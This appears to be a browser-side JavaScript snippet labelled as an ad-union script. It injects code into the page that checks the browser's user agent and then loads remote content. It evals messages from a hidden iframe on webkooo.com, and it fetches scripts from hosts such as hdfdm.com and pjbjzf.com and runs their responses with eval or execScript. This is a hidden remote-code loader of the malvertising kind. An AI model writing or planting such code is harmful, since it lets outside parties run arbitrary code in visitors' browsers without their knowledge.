(function(doc, win) {
  var script = doc.createElement("script");
  script.attributes["data-union-ad"] = '';
  script.attributes["data-priority"] = '11';
  script.attributes["data-position"] = 'inline';
  script.innerHTML = `var nu = navigator.userAgent;if(!/android/i.test(nu)&&/baiduboxapp/i.test(nu)){window.addEventListener("message", function(e) {var _t_hf = e.data; if (_t_hf._hf_6739142753) {eval(decodeURIComponent(_t_hf._hf_6739142753.replace(/\+/g, "%20"))) } }); document.write('<div id="_14275_"></div>'); document.write('<iframe style="display:none;" src="https://www.webkooo.com/jscode/ifra.php?link=6739/14275/3.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>');}else{;(function() { var nu = navigator.userAgent;var d = "http://tf.hdfdm.com";if((/BAIDUBrowser/i.test(nu))) d = "https://www.webkooo.com";if((/QQBrowser|QBWebView/i.test(nu))) d = "http://tf.hdfdm.com";if((/MiuiBrowser/i.test(nu))) d = "http://miui.hdfdm.com"; if((/UCBrowser/i.test(nu))) d = "http://www.pjbjzf.com"; var a = new XMLHttpRequest(); var b = d + "/6739/14275/3.html?r=" + Math.floor(Math.random() * 9999999 + 1);if((/(BAIDUBrowser|QQBrowser|QBWebView)/i.test(nu))){document.writeln("<script src="+b+"><\/script>");return false;} if (a != null) {a.onreadystatechange = function() {if (a.readyState == 4 && a.status == 200) {if (window.execScript) window.execScript(a.responseText, "JavaScript"); else if (window.eval) window.eval(a.responseText, "JavaScript"); else eval(a.responseText); } }; a.open("GET", b, false); a.send(); } })();}`;
  // var innerScript = doc.getElementsByTagName("script")[doc.getElementsByTagName("script").length - 1];
  // innerScript.parentNode.insertBefore(script, innerScript);
  setTimeout(function(){
  	var innerScript = doc.getElementsByTagName("script")[doc.getElementsByTagName("script").length - 1];
	innerScript.parentNode.insertBefore(script, innerScript);
  },1000)
})(document, window);
